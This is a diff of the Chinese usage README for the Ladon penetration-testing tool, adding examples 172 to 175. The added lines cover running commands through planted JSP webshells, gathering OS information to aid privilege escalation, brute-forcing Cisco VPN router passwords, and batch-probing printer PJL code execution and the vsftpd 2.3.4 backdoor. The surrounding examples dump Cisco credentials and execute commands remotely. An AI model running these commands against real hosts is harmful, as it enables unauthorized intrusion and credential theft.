@@ -5,8 +5,8 @@ Windows版本: .Net、Cobalt Strike、PowerShell
 PS: GUI版主要方便本地测试使用，完整功能使用CMD
 
 ### 版本
-Ladon9.2.1 20220911
-简明用法例子 171例
+Ladon9.2.4 20221018
+简明用法例子 175例
 
 ### 001 自定义线程扫描
 例子：扫描目标10.1.2段是否存在MS17010漏洞
@@ -138,8 +138,8 @@ Ladon 192.168.1.8 PortScan 80,445,3389
 Ladon 192.168.1.8/24 WhatCMS
 
 ##### 030 扫描思科设备
-Ladon 192.168.1.8/24 CiscoScan
-Ladon http://192.168.1.8 CiscoScan
+Ladon 192.168.1.8/24 CiscoInfo
+Ladon http://192.168.1.8 CiscoInfo
 
 ##### 031 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）
 Ladon EnumMssql
@@ -415,6 +415,9 @@ Usage：Ladon WebShell ScriptType ShellType url pwd cmd
 Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami
 Example: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoami
 Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami
+Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon whoami
+获取系统版本信息 方便提权
+Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon OSinfo
 ```
 
 ##### 105 135端口 WmiExec2远程执行命令 （非交互式）支持文件上传
@@ -546,7 +549,7 @@ Ladon sc c:\123.exe auto ServerName
 ### 系统信息探测
 
 ##### 136  Snmp协议探测操作系统、设备等信息
-Ladon 192.168.1.8/24 SnmpScan 
+Ladon 192.168.1.8/24 SnmpInfo
 
 ##### 137  Nbt协议探测Windows主机名、域、用户
 Ladon 192.168.1.8/24 NbtInfo
@@ -681,6 +684,9 @@ Ladon EXP-2022-27925 https://zimbra.k8gege.org poc.zip
 ##### 167 WebShellCmd 连接jsp WebShell(支持cd、k8、ua、uab64)
 Ladon WebShell jsp ua https://zimbra.k8gege.org pass whoami
 
+##### JSP UAshell 查看系统版本、python、gcc等信息方便提权
+Ladon WebShell jsp ua https://zimbra.k8gege.org pass OSinfo
+
 ##### 168 WebShellCmd 连接jsp WebShell(支持cd、k8、ua、uab64)
 Ladon WebShell jsp uab64 https://zimbra.k8gege.org pass whoami
 
@@ -689,9 +695,31 @@ Ladon IISdoor http://192.168.1.142 whoami
 Ladon IISdoor http://192.168.1.142 SIMPLEPASS whoami
 
 ##### 170 FindIP匹配IP段是否出现在漏洞结果中
-Ladon FindIP ipc.txt ISVUL.txt
+Ladon FindIP ipc.txt ISVUL.txt		 (精确搜索)
+Ladon FindIP ipc.txt ISVUL.txt like  (模糊搜索)
 
 ##### 171 CiscoDump CVE-2019-1653 Cisco RV320 RV325 Dump Password
 Ladon https://192.168.1.8 CiscoDump
 Ladon url.txt CiscoDump 批量探测Cisco漏洞并导出用户密码
 
+##### 172 PrinterPoc  打印机PJL任意代码执行漏洞批量检测
+Ladon 192.168.1.8 PrinterPoc
+Ladon ip.txt PrinterPoc
+禁ping机器扫描使用noping
+Ladon noping 192.168.1.8 PrinterPoc
+Ladon noping ip.txt PrinterPoc
+
+##### 173 通过Mac查询制造商(Ladon Mac MAC地址)
+Ladon Mac ff-ff-ff-ff-ff-ff
+Ladon Mac 01:00:5e:00:00:16
+Ladon Mac ff5e00885d66
+
+##### 174 Cisco VPN路由器密码爆破(内置默认密码，支持明文、Hash)
+Ladon 192.168.1.8/24 CiscoScan
+Ladon https://192.168.1.8 CiscoScan
+Ladon ip.txt CiscoScan
+Ladon url.txt CiscoScan​
+
+##### 175 vsFTPdPoc	CVE-2011-2523 vsftpd 2.3.4 笑脸后门漏洞检测
+Ladon noping ip CVE-2011-2523
+Ladon noping ip.txt vsFTPdPoc  
